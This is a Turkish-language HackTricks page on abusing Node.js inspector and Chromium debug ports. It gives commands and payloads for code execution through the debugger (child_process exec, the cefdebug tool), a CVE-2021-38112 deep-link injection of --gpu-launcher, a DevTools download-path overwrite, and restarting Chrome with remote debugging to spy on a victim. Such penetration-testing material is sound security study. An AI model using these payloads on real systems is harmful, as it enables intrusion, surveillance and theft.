# Node inspector/CEF debug kötüye kullanımı

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Temel Bilgiler

[Dökümantasyondan](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Bir Node.js işlemi `--inspect` anahtarıyla başlatıldığında, bir hata ayıklama istemcisi dinler. **Varsayılan olarak**, host ve port **`127.0.0.1:9229`** adresinde dinleyecektir. Her işleme ayrıca **benzersiz** bir **UUID** atanır.

İnceleyici istemcilerin bağlanmak için host adresini, portu ve UUID'yi bilmeleri ve belirtmeleri gerekir. Tam bir URL şuna benzer bir şey olacaktır: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
**Hata ayıklama aracının Node.js yürütme ortamına tam erişimi olduğundan**, bu porta bağlanabilen kötü niyetli bir aktör, Node.js işlemi adına keyfi kodları yürütebilir (**potansiyel ayrıcalık yükseltme**).
{% endhint %}

İnceleyiciyi başlatmanın birkaç yolu vardır:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
İncelenen bir işlem başlatıldığında şöyle bir şey görünecektir:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) gibi **CEF** tabanlı işlemler, hata ayıklama aracını açmak için `--remote-debugging-port=9222` parametresini kullanmalıdır (SSRF korumaları oldukça benzer kalır). Bununla birlikte, **NodeJS** hata ayıklama oturumu vermek yerine tarayıcı ile iletişim kurmak için [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) kullanırlar, bu tarayıcıyı kontrol etmek için bir arayüzdür, ancak doğrudan bir RCE yoktur.

Hata ayıklanan bir tarayıcı başlattığınızda şöyle bir şey görünecektir:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Tarayıcılar, WebSoketler ve aynı köken politikası <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Web siteleri bir web tarayıcısında WebSocket ve HTTP istekleri yapabilirler tarayıcı güvenlik modeli altında. **Benzersiz bir hata ayıklayıcı oturum kimliği almak için başlangıçta bir HTTP bağlantısı** gereklidir. **Aynı köken politikası**, web sitelerinin **bu HTTP bağlantısını** yapmasını engeller. [**DNS yeniden bağlama saldırılarına karşı ek güvenlik için**](https://en.wikipedia.org/wiki/DNS\_rebinding)**, Node.js bağlantı için 'Host' başlıklarının ya bir **IP adresi** ya da **`localhost`** ya da **`localhost6`** belirtmesini doğrular.

{% hint style="info" %}
Bu **güvenlik önlemleri, denetleyiciyi istismar etmeyi** ve **yalnızca bir HTTP isteği göndererek kod çalıştırmayı** (bu, bir SSRF zafiyetini istismar etmek suretiyle yapılabilir) **engeller**.
{% endhint %}

### Çalışan işlemlerde denetleyiciyi başlatma

Bir nodejs işlemine **SINYAL SIGUSR1** gönderebilirsiniz ve bu işlemi **varsayılan bağlantı noktasında denetleyiciyi başlatır**. Ancak, yeterli ayrıcalığa sahip olmanız gerektiğini unutmayın, bu nedenle bu size işlem içindeki bilgilere **öncelikli erişim sağlayabilir** ancak doğrudan bir ayrıcalık yükseltme sağlamaz.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Bu, **işlemi durdurup yeni bir tane başlatmak** `--inspect` ile bir seçenek olmadığı için **konteynerlerde** kullanışlıdır çünkü **konteyner** işlemle birlikte **sonlandırılacaktır**.
{% endhint %}

### Denetleyiciye/hata ayıklayıcıya bağlanma

Bir **Chromium tabanlı tarayıcıya** bağlanmak için, sırasıyla Chrome veya Edge için `chrome://inspect` veya `edge://inspect` URL'lerine erişilebilir. Hedef ana bilgisayar ve bağlantı noktasının doğru bir şekilde listelendiğinden emin olmak için Yapılandır düğmesine tıklanmalıdır. Resim, Uzaktan Kod Yürütme (RCE) örneğini göstermektedir:

![](<../../.gitbook/assets/image (674).png>)

**Komut satırı** kullanılarak bir hata ayıklayıcıya/denetleyiciye bağlanabilirsiniz:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), yerel olarak çalışan **denetleyicileri bulmayı** ve bunlara **kod enjekte etmeyi** sağlar.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
**NodeJS RCE saldırıları**, bir tarayıcıya [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) aracılığıyla bağlandığınızda çalışmayacaktır (ilginç şeyler yapmak için API'yi kontrol etmeniz gerekmektedir).
{% endhint %}

## NodeJS Hata Ayıklayıcı/İnceleyici'de Uzaktan Kod Çalıştırma

{% hint style="info" %}
Eğer [**Electron'da XSS ile RCE almayı**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/) arıyorsanız, lütfen bu sayfaya bakınız.
{% endhint %}

Bir Node **inceleyici**ne bağlandığınızda **RCE** elde etmenin bazı yaygın yolları şunları içerir (görünüşe göre bu, **Chrome DevTools protokolüne bağlı bir bağlantıda çalışmayacaktır**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

API'yi buradan kontrol edebilirsiniz: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Bu bölümde, bu protokolü kötüye kullanmak için insanların kullandığı ilginç şeyleri listeleyeceğim.

### Derin Bağlantılar Aracılığıyla Parametre Enjeksiyonu

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security, CEF tabanlı bir uygulamanın sistemde özel bir URI (workspaces://) kaydettiğini keşfetti ve ardından tam URI'yi alan ve ardından o URI'den kısmen oluşturulan bir yapılandırmayla CEF tabanlı uygulamayı başlattığını tespit etti.

URI parametrelerinin URL çözümlendiği ve CEF temel uygulamasını başlatmak için kullanıldığı keşfedildi, bu da bir kullanıcının **komut satırına** bayrak **`--gpu-launcher`** enjekte etmesine ve keyfi şeyler yürütmesine olanak tanıdı.

Bu nedenle, şu gibi bir yük:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
### Dosya Üzerine Yazma

İndirilen dosyaların kaydedileceği klasörü değiştirin ve sıkça kullanılan uygulamanın kaynak kodunu **kötü amaçlı kodunuzla** üzerine yazacak bir dosya indirin.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE ve veri sızdırma

Bu yazıya göre: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) RCE elde etmek ve theriver'dan iç sayfaları sızdırmak mümkündür.

### Saldırı Sonrası

Gerçek bir ortamda ve bir kullanıcının Chrome/Chromium tabanlı tarayıcı kullanan bir PC'sini ele geçirdikten **sonra**, Chrome işlemi başlatabilir ve hata ayıklama etkinleştirilmiş ve hata ayıklama bağlantı noktasını yönlendirerek hata ayıklama bağlantı noktasına erişebilirsiniz. Bu şekilde **kurbanın Chrome'da yaptığı her şeyi inceleyebilir ve hassas bilgileri çalabilirsiniz**.

Gizlilik sağlayan yol, **her Chrome işlemini sonlandırmak** ve ardından şuna benzer bir şey çağırmaktır:
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referanslar

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>A'dan Z'ye AWS hackleme konusunda bilgi edinin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** istiyorsanız [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'ı takip edin.
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
